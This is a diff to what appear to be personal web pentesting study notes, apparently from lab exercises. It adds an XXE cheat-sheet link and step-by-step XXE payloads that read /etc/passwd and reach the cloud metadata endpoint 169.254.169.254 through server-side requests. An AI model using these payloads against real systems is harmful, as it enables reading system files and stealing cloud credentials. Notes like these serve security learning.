@@ -24,6 +24,9 @@ https://hackersonlineclub.com/command-injection-cheatsheet/
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 [XSS Cheat]
 
+https://cheatsheet.haax.fr/web-pentest/files-and-files-inclusions/xxe/
+[XXE/XML cheat]
+
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 [SQL cheat sheet]
 
@@ -363,6 +366,12 @@ sudo openvpn nmap -sV {target IP}
 // if you close collaborator while testing you'll need to generate a new domian 
 
 #XXE 
+[+] intercept check stock, check content typr for XML
+- paste payload {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>} under XML 
+- change number under product ID to <xxe;> and send request to read data stored in the XXE variable
+[+] {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>} change file path to IP address of server ypu want to commuicate with 
+- clear the product ID, add <xxe;>
+- if the error message prompts you to a dir, add the dir to your payload path e.g {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/new_path"> ]>}
 
 *******************************
 ****INFORMATION GATHERING******
